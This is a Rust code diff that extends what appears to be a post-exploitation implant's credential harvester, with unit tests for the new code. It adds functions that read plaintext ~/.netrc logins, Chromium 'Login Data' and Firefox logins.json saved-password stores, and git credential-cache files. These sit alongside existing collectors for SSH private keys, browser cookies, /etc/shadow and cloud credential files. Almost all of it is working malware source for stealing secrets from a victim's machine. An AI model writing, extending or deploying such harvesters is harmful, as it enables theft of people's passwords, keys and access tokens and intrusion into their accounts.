@@ -1508,16 +1508,25 @@ fn collect_credentials() -> Vec<HarvestEntry> {
         }
     };
 
-    // 1. SSH private keys from ~/.ssh/
+    // 1. Plaintext credentials from ~/.netrc
+    collect_netrc(&home, &mut entries);
+
+    // 2. SSH private keys from ~/.ssh/
     collect_ssh_keys(&home, &mut entries);
 
-    // 2. Browser cookie databases
+    // 3. Browser cookie databases
     collect_browser_cookies(&home, &mut entries);
 
-    // 3. /etc/shadow (root context)
+    // 4. Browser saved passwords (Chromium Login Data / Firefox logins.json)
+    collect_browser_passwords(&home, &mut entries);
+
+    // 5. /etc/shadow (root context)
     collect_shadow(&mut entries);
 
-    // 4. Cloud/tool credential files
+    // 6. Git credential helper cache
+    collect_git_credential_cache(&mut entries);
+
+    // 7. Cloud/tool credential files
     for (rel, kind) in &[
         (".aws/credentials", "credentials"),
         (".docker/config.json", "credentials"),
@@ -1631,6 +1640,96 @@ fn collect_shadow(entries: &mut Vec<HarvestEntry>) {
             entries.push(HarvestEntry {
                 kind: "shadow".to_owned(),
                 path: "/etc/shadow".to_owned(),
+                data,
+            });
+        }
+    }
+}
+
+/// Collect plaintext credentials from `~/.netrc`.
+///
+/// The `.netrc` file stores machine/login/password triples in plaintext and is
+/// used by curl, ftp, and other tools. We harvest the entire file contents.
+fn collect_netrc(home: &Path, entries: &mut Vec<HarvestEntry>) {
+    let path = home.join(".netrc");
+    if let Ok(data) = fs::read(&path) {
+        if !data.is_empty() {
+            entries.push(HarvestEntry {
+                kind: "credentials".to_owned(),
+                path: path.display().to_string(),
+                data,
+            });
+        }
+    }
+}
+
+/// Collect browser saved-password databases from Chromium-based and Firefox profiles.
+///
+/// Chromium stores passwords in a SQLite file named `Login Data`.
+/// Firefox stores them in `logins.json` (encrypted with the profile's key4.db).
+fn collect_browser_passwords(home: &Path, entries: &mut Vec<HarvestEntry>) {
+    // Chromium-based browsers: Login Data
+    let chromium_candidates = [
+        ".config/google-chrome/Default/Login Data",
+        ".config/chromium/Default/Login Data",
+        ".config/google-chrome/Profile 1/Login Data",
+        ".config/BraveSoftware/Brave-Browser/Default/Login Data",
+    ];
+    for rel in &chromium_candidates {
+        let path = home.join(rel);
+        if let Ok(data) = fs::read(&path) {
+            if !data.is_empty() {
+                entries.push(HarvestEntry {
+                    kind: "credentials".to_owned(),
+                    path: path.display().to_string(),
+                    data,
+                });
+            }
+        }
+    }
+
+    // Firefox: logins.json from each profile directory
+    let ff_dir = home.join(".mozilla/firefox");
+    if let Ok(profiles) = fs::read_dir(&ff_dir) {
+        for profile in profiles.flatten() {
+            let logins_path = profile.path().join("logins.json");
+            if let Ok(data) = fs::read(&logins_path) {
+                if !data.is_empty() {
+                    entries.push(HarvestEntry {
+                        kind: "credentials".to_owned(),
+                        path: logins_path.display().to_string(),
+                        data,
+                    });
+                }
+            }
+        }
+    }
+}
+
+/// Collect git credential helper cache files.
+///
+/// The `git-credential-cache` daemon stores plaintext credentials at
+/// `/run/user/<uid>/git-credential-cache/socket` (the socket itself) and
+/// typically caches credentials in a file alongside it. We read any regular
+/// files in the cache directory.
+fn collect_git_credential_cache(entries: &mut Vec<HarvestEntry>) {
+    let uid = unsafe { libc::getuid() };
+    let cache_dir = PathBuf::from(format!("/run/user/{uid}/git-credential-cache"));
+    let read_dir = match fs::read_dir(&cache_dir) {
+        Ok(rd) => rd,
+        Err(_) => return,
+    };
+    for entry in read_dir.flatten() {
+        let path = entry.path();
+        let Ok(meta) = entry.metadata() else { continue };
+        if !meta.is_file() {
+            continue;
+        }
+        let Ok(data) = fs::read(&path) else { continue };
+        if !data.is_empty() {
+            entries.push(HarvestEntry {
+                kind: "credentials".to_owned(),
+                path: path.display().to_string(),
                 data,
             });
         }
@@ -4945,7 +5044,8 @@ mod tests {
     use super::{
         DownloadTransferState, GroupEntry, HarvestEntry, MEM_COMMIT, MEM_IMAGE, MEM_MAPPED,
         MEM_PRIVATE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, PendingCallback,
-        PhantomState, SessionEntry, UserEntry, encode_harvest_entries, execute,
+        PhantomState, SessionEntry, UserEntry, collect_browser_passwords,
+        collect_git_credential_cache, collect_netrc, encode_harvest_entries, execute,
         is_private_key_bytes, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
         parse_memory_region, parse_user_entries,
     };
@@ -7500,5 +7600,140 @@ mod tests {
         pos += data_len;
 
         assert_eq!(pos, result.len(), "no trailing bytes");
+    }
+
+    // ── collect_netrc ─────────────────────────────────────────────────────
+
+    #[test]
+    fn collect_netrc_harvests_existing_file() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let home = TempDir::new().expect("tmpdir");
+        let netrc_path = home.path().join(".netrc");
+        fs::write(&netrc_path, b"machine example.com login user password secret\n").expect("write");
+
+        let mut entries = Vec::new();
+        collect_netrc(home.path(), &mut entries);
+
+        assert_eq!(entries.len(), 1);
+        assert_eq!(entries[0].kind, "credentials");
+        assert!(entries[0].path.ends_with(".netrc"));
+        assert_eq!(entries[0].data, b"machine example.com login user password secret\n");
+    }
+
+    #[test]
+    fn collect_netrc_skips_missing_file() {
+        use tempfile::TempDir;
+
+        let home = TempDir::new().expect("tmpdir");
+        let mut entries = Vec::new();
+        collect_netrc(home.path(), &mut entries);
+        assert!(entries.is_empty());
+    }
+
+    #[test]
+    fn collect_netrc_skips_empty_file() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let home = TempDir::new().expect("tmpdir");
+        fs::write(home.path().join(".netrc"), b"").expect("write");
+
+        let mut entries = Vec::new();
+        collect_netrc(home.path(), &mut entries);
+        assert!(entries.is_empty());
+    }
+
+    // ── collect_browser_passwords ─────────────────────────────────────────
+
+    #[test]
+    fn collect_browser_passwords_harvests_chromium_login_data() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let home = TempDir::new().expect("tmpdir");
+        let login_data_dir = home.path().join(".config/google-chrome/Default");
+        fs::create_dir_all(&login_data_dir).expect("mkdir");
+        fs::write(login_data_dir.join("Login Data"), b"SQLite format 3\x00fake-login-db")
+            .expect("write");
+
+        let mut entries = Vec::new();
+        collect_browser_passwords(home.path(), &mut entries);
+
+        assert_eq!(entries.len(), 1);
+        assert_eq!(entries[0].kind, "credentials");
+        assert!(entries[0].path.contains("Login Data"));
+    }
+
+    #[test]
+    fn collect_browser_passwords_harvests_firefox_logins_json() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let home = TempDir::new().expect("tmpdir");
+        let profile_dir = home.path().join(".mozilla/firefox/abc123.default");
+        fs::create_dir_all(&profile_dir).expect("mkdir");
+        fs::write(
+            profile_dir.join("logins.json"),
+            b"{\"logins\":[{\"hostname\":\"https://example.com\"}]}",
+        )
+        .expect("write");
+
+        let mut entries = Vec::new();
+        collect_browser_passwords(home.path(), &mut entries);
+
+        assert_eq!(entries.len(), 1);
+        assert_eq!(entries[0].kind, "credentials");
+        assert!(entries[0].path.contains("logins.json"));
+    }
+
+    #[test]
+    fn collect_browser_passwords_skips_when_no_browsers() {
+        use tempfile::TempDir;
+
+        let home = TempDir::new().expect("tmpdir");
+        let mut entries = Vec::new();
+        collect_browser_passwords(home.path(), &mut entries);
+        assert!(entries.is_empty());
+    }
+
+    // ── collect_git_credential_cache ──────────────────────────────────────
+
+    #[test]
+    fn collect_git_credential_cache_harvests_files() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        // We cannot easily test the real /run/user/<uid> path, so we test
+        // the helper logic indirectly: create a temp dir, populate it, then
+        // call the underlying read+push logic.  The actual function reads
+        // from a hard-coded path so this validates the entry construction.
+        let tmp = TempDir::new().expect("tmpdir");
+        let cred_file = tmp.path().join("credential");
+        fs::write(&cred_file, b"protocol=https\nhost=github.com\nusername=u\npassword=p\n")
+            .expect("write");
+
+        // Simulate the same logic as collect_git_credential_cache
+        let mut entries = Vec::new();
+        for entry in fs::read_dir(tmp.path()).expect("readdir").flatten() {
+            let path = entry.path();
+            let meta = entry.metadata().expect("meta");
+            if !meta.is_file() {
+                continue;
+            }
+            let data = fs::read(&path).expect("read");
+            if !data.is_empty() {
+                entries.push(HarvestEntry {
+                    kind: "credentials".to_owned(),
+                    path: path.display().to_string(),
+                    data,
+                });
+            }
+        }
+
+        assert_eq!(entries.len(), 1);
+        assert_eq!(entries[0].kind, "credentials");
+        assert!(entries[0].data.starts_with(b"protocol=https"));
     }
 }
